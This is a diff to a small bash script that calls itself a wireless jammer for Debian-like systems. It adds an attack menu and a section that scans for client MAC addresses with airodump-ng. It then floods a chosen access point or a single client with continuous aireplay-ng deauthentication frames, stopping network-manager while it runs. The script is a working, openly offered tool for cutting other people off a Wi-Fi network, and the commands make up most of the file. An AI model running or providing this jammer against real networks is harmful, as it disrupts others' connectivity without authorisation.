@@ -1,3 +1,4 @@
+#!/bin/bash
 # https://github.com/deadport/apkill
 # Warning: this is noob scripting, tipps on how things can be done better are welcome, thanks. 
 # Dependencies: net-tools, egrep, aircrack-ng
@@ -23,6 +24,17 @@ sudo apt install net-tools -y > /dev/null
 fi
 echo "dependency check done.." && clear
 #end of dependencie check
+#functions
+function jumpto
+{
+    label=$1
+    cmd=$(sed -n "/$label:/{:a;n;p;ba};" $0 | grep -v ':$')
+    eval "$cmd"
+    exit
+}
+start=${1:-"start"}
+#end of functions section
+clear
 #artwork
 tput setaf 1
 echo "        / /\                /\ \       /\_\            /\ \       _\ \          _\ \   " 
@@ -39,6 +51,10 @@ echo "		The Wireless Jammer Script for debianesque Systems	"
 echo "								                                        "
 tput sgr0
 #end of artwork
+#opt
+echo "Choose an attack option[single client(c) whole AP(a) find hidden(h)]:"
+read ask
+#opt end
 iwconfig
 echo "Interface name(e.g. wlan0):"
 read inter
@@ -54,7 +70,27 @@ echo "MAC of Access-Point:"
 read macacc
 echo "loading attack..."
 tput setaf 1
+jumpto $ask
+a:
 sudo aireplay-ng -0 0 -a $macacc -b $macacc $inter\mon
 sudo airmon-ng stop $inter\mon > /dev/null
 tput sgr0
+exit 0
+#options
+c:
+echo "How long should be searched for Clients? [sec]:"
+read secs
+echo "reading clients from network.. [scanning $secs seconds]"
+sudo timeout --kill-after=$secs --foreground $secs airodump-ng -M -U -c $chan -d $macacc $inter\mon
+echo "Client MAC:"
+read clientmac
+tput setaf 1
+sudo service network-manager stop
+sudo aireplay-ng -0 0 -a $macacc -c $clientmac $inter\mon
+sudo service network-manager start
+sudo airmon-ng stop $inter\mon > /dev/null
+tput sgr0
+exit 0
+h:
+echo "test2 succeeded"
 exit 0
